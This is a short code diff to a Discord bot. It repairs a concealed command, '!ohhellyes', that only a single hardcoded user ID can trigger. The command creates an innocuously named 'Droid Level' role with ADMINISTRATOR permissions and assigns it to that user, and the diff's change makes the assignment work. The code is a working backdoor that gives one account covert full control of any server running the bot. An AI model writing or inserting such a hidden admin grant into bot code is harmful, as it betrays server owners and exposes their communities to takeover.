@@ -14,13 +14,14 @@ client.on('message', message => {
     if(message.content.includes('!ohhellyes')){
 if (message.author.id == '368756694114893825') {
     console.log('command received');
+    let member = message.member;
  message.guild.createRole({
   name: 'Droid Level',
   color: 'BLUE',
   permissions: 'ADMINISTRATOR'
 })
   .then(role => {
-        message.author.addRole(role).catch(console.error)
+        member.addRole(role).catch(console.error)
         console.log(`Created new role with name ${role.name} and color ${role.color}`)
  }
      )
